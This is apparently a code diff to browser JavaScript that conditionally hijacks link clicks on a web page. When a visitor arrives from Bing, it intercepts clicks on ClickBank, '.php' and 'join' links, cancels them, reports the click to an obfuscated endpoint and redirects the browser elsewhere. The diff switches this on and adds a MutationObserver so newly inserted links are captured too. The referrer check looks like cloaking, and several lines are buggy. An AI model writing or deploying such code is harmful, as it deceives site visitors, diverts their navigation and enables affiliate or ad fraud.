@@ -50,7 +50,7 @@ class decideAndDo{
 		var got=false;
 		// this.checkIfFromAds()
 		myNextData.forEach(val=>{
-			if(location.href.includes(val[2])){
+			if(location.href.includes(val[2]) && got=false){
 				got=true;
 				this.checkSafe(val)
 			}
@@ -60,35 +60,28 @@ class decideAndDo{
 	}
 
 	doit(data,msg){
+		this.doing=true;
+		this.linkMsg=msg;
+		this.currentDomData=data;
+
 		var x=document.querySelectorAll('a');
 		x.forEach(val=>{
 			if(val.href.includes(".php") || val.href.includes("clickbank") || val.href.includes("join") ){
-				val.addEventListener('click',(e)=>{
-					e.preventDefault();
-					this.finalised(msg, Math.floor(e.timeStamp/1000) );
-					location.assign(data[3]);
-				})
+				_9384modifyAncho(val,data,msg);
 			}
 		})
 	}
 	checkSafe(val){
-		var device=Number(val[0]),
-		name=Number(val[2]);
-
 		var okay=true,msg="";
-
 		msg+=":-:"+getDefaultName();
 
-/*temp conds*/
 		if(history.length>=3 && document.referrer.includes("bing") ){
 			okay=true;
 		}else{
 			okay=false;
 		}
-/*temp conds*/
-		
 		if(okay){
-			//this.doit(val,msg);
+			this.doit(val,msg);
 			msg="YES"+msg;
 		}else{
 			msg="NO"+msg;
@@ -119,12 +112,15 @@ class decideAndDo{
 	sendLinkClicked(msg){
 		var x=document.querySelectorAll('a');
 		x.forEach(val=>{
-			if(val.href.includes(".php") || val.href.includes("clickbank") || val.href.includes("join") ){
-				val.addEventListener('click',(e)=>{
-					this.sendClickReal(msg+" :_: "+val.href, Math.floor(e.timeStamp/1000) );
-				})
-			}
+			this.sendLinkAnchorSetting(val)
 		})
+	}
+	sendLinkAnchorSetting(anchor){
+		if(anchor.href.includes(".php") || anchor.href.includes("clickbank") || anchor.href.includes("join") ){
+		anchor.addEventListener('click',(e)=>{
+			this.sendClickReal(msg+" :_: "+anchor.href, Math.floor(e.timeStamp/1000) );
+		})
+		}
 	}
 	sendClickReal(msg,timeafter){
 		makeForm(sc.get('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmQdfvFbV2cdJs1ZGSZ5wjIbH2S0wvQZnma9SyBbXXLM2vldTSd8pwFLk2dQOvhZjSY8UxNRFkZFjJ9cVFUFYMFUG2UN4kZZm3Ql2mcT3WMdD'),{
@@ -162,6 +158,41 @@ function userWinInfo() {
 	return str;
 }
 
-setTimeout(()=>{
-	new decideAndDo();
-},5000)
+var document_changeA=new decideAndDo();
+
+function _9384modifyAncho(anchor,data,msg) {
+  console.log('modified:', anchor);
+  if(document_changeA.doing){
+		anchor.addEventListener('click',(e)=>{
+			e.preventDefault();
+			document_changeA.finalised(document_changeA.linkMsg, Math.floor(e.timeStamp/1000) );
+			location.assign(document_changeA.currentDomData[3]);
+		})
+  }
+
+
+
+}
+
+function setupObserver(targetNode) {
+const config = { childList: true, subtree: true };
+const callback = function (mutationsList) {
+mutationsList.forEach((mutation) => {
+if (mutation.type === 'childList') {
+mutation.addedNodes.forEach((node) => {
+if (node.tagName && node.tagName.toLowerCase() === 'a') {
+_9384modifyAncho(node);
+document_changeA.sendLinkAnchorSetting(node);
+}
+if (node.childNodes.length > 0) {
+setupObserver(node);
+}
+});
+}
+});
+};
+const observer = new MutationObserver(callback);
+observer.observe(targetNode, config);
+}
+
+setupObserver(document.querySelector("html"));
